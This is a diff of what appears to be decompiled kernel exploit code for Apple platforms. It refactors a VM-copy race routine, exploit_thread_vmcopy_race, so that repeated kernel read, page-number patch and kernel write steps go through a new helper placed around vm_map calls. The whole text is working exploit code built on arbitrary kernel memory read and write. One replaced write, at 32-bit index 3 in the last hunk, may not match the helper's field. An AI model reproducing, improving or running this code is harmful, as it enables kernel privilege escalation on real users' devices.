@@ -111,6 +111,14 @@ typedef struct EntitlementIokitThreadArg
   int status;
 } EntitlementIokitThreadArg;
 
+static inline void vmcopy_patch_memory_entry_page(__int64 kreadCtx, __int64 pageInfoKaddr, uint32_t ppnum, __int128 scratch[2])
+{
+  memset(scratch, 0, 32);
+  kread_via_kobject(kreadCtx, pageInfoKaddr, (__int64)scratch, 32);
+  HIDWORD(scratch[0]) = ppnum;
+  kwrite_u64_via_kobject(kreadCtx, pageInfoKaddr, (__int64)scratch, 32);
+}
+
 //----- (00000000000068F4) ----------------------------------------------------
 void __fastcall deallocate_physmap_pages(__int64 a1)
 {
@@ -7921,28 +7929,16 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
     v101 = v25 + 272;
     v26 = v25 & 0xFFFFFFFFFFFFC000LL;
     v152 = 0;
-    memset(__dst, 0, 32);
-    kread_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)__dst, 32);
-    HIDWORD(__dst[0]) = *(uint64_t *)(someStruct + 32);
-    kwrite_u64_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)__dst, 32);
+    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, *(uint64_t *)(someStruct + 32), __dst);
     vm_map(mach_task_self_, &v152, 0x4000u, 0, 1, object_handle, v23 & 0xFFFFFFFFFFFFC000LL, 0, 3, 3, 1u);
-    memset(__dst, 0, 32);
-    kread_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)__dst, 32);
-    HIDWORD(__dst[0]) = v102 >> v159;
-    kwrite_u64_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)__dst, 32);
+    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, v102 >> v159, __dst);
     v97 = qword_48008;
     v98 = v152;
     v151 = 0;
-    memset(__dst, 0, 32);
-    kread_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)__dst, 32);
-    HIDWORD(__dst[0]) = *(uint64_t *)(someStruct + 32);
-    kwrite_u64_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)__dst, 32);
+    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, *(uint64_t *)(someStruct + 32), __dst);
     v108 = v26;
     vm_map(mach_task_self_, &v151, 0x4000u, 0, 1, object_handle, v26, 0, 3, 3, 1u);
-    memset(__dst, 0, 32);
-    kread_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)__dst, 32);
-    HIDWORD(__dst[0]) = v102 >> v159;
-    kwrite_u64_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)__dst, 32);
+    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, v102 >> v159, __dst);
     v27 = v151;
     v150 = 0;
     memset(v180, 0, sizeof(v180));
@@ -8130,15 +8126,9 @@ LABEL_68:
       v67 = (v65 - v64) >> v159;
     v99 = v67;
     v144 = 0;
-    memset(__dst, 0, 32);
-    kread_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)__dst, 32);
-    HIDWORD(__dst[0]) = *(uint64_t *)(someStruct + 32);
-    kwrite_u64_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)__dst, 32);
+    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, *(uint64_t *)(someStruct + 32), __dst);
     vm_map(mach_task_self_, &v144, 0x4000u, 0, 1, object_handle, v108, 0, 3, 3, 1u);
-    memset(__dst, 0, 32);
-    kread_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)__dst, 32);
-    HIDWORD(__dst[0]) = v102 >> v159;
-    kwrite_u64_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)__dst, 32);
+    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, v102 >> v159, __dst);
     *(uint64_t *)(someStruct + 24) = v144 + v105;
     flush_cpu_cache(*(uint64_t *)(someStruct + 8), v101, *(uint32_t *)(someStruct + 656));
     memcpy(__dst, *(const void **)(someStruct + 24), sizeof(__dst));
@@ -8266,15 +8256,13 @@ LABEL_68:
     v87 = *(uint64_t *)(someStruct + 360) & 0xFFFFFFFFFFFFC000LL;
     v88 = *(uint64_t *)(someStruct + 360) & 0x3FFFLL;
     v110 = 0;
-    memset(pageInfoPayload, 0, 32);
-    kread_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)pageInfoPayload, 32);
-    ((uint32_t *)pageInfoPayload)[3] = *(uint64_t *)(someStruct + 32);
-    kwrite_u64_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)pageInfoPayload, 32);
+    vmcopy_patch_memory_entry_page(
+      *(uint64_t *)(someStruct + 8),
+      v103,
+      *(uint64_t *)(someStruct + 32),
+      (__int128 *)pageInfoPayload);
     vm_map(mach_task_self_, &v110, 0x4000u, 0, 1, object_handle, v87, 0, 3, 3, 1u);
-    memset(pageInfoPayload, 0, 32);
-    kread_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)pageInfoPayload, 32);
-    ((uint32_t *)pageInfoPayload)[3] = v102 >> v159;
-    kwrite_u64_via_kobject(*(uint64_t *)(someStruct + 8), v103, (__int64)pageInfoPayload, 32);
+    vmcopy_patch_memory_entry_page(*(uint64_t *)(someStruct + 8), v103, v102 >> v159, (__int128 *)pageInfoPayload);
     v89 = v110 + v88;
     *(uint64_t *)(someStruct + 352) = v110 + v88;
     *(uint64_t *)(v89 + 264) = 1094795585;
